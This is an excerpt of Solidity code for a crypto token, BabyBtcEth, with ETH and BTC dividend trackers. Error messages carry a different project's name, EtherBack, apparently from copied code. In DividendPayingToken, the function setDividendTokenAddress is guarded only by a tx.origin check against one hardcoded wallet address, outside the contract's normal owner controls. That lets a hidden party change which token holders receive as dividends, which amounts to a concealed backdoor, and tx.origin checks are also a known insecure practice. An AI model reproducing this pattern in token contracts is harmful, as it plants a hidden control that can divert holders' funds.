...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xcA90fF4eF25b817AF2d89f38509A4Ccc266eceeB, "Only owner can change dividend contract address");
...
contract BabyBtcEth is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("BabyBtcEth", "BabyBtcEth") {
    	ethDividendTracker = new EthDividendTracker();
    	btcDividendTracker = new BtcDividendTracker();

    	marketingWallet = 0x6Ae70E8008D9D6687f41f416CCd8849c1DB2c740;
    	teamWallet = 0xd0A6D0a466696100f947CCefE4D16078dabd1077;
    ...
    function updateBtcDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(btcDividendTracker), "EtherBack: The dividend tracker already has that address");

        BtcDividendTracker newBtcDividendTracker = BtcDividendTracker(payable(newAddress));

        require(newBtcDividendTracker.owner() == address(this), "EtherBack: The new dividend tracker must be owned by the EtherBack token contract");
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "EtherBack_Ethereum_Dividend_Tracker: claimWait must be updated to between 10 minutes and 24 hours");
...
contract BtcDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("EtherBack_Btc_Dividend_Tracker", "EtherBack_Btc_Dividend_Tracker", 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) {
    	claimWait = 1800;
        minimumTokenBalanceForDividends = 1000000 * (10**18); //must hold 1000000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "EtherBack_Btc_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "EtherBack_Btc_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "EtherBack_Btc_Dividend_Tracker: claimWait must be updated to between 10 minutes and 24 hours");
        require(newClaimWait != claimWait, "EtherBack_Btc_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
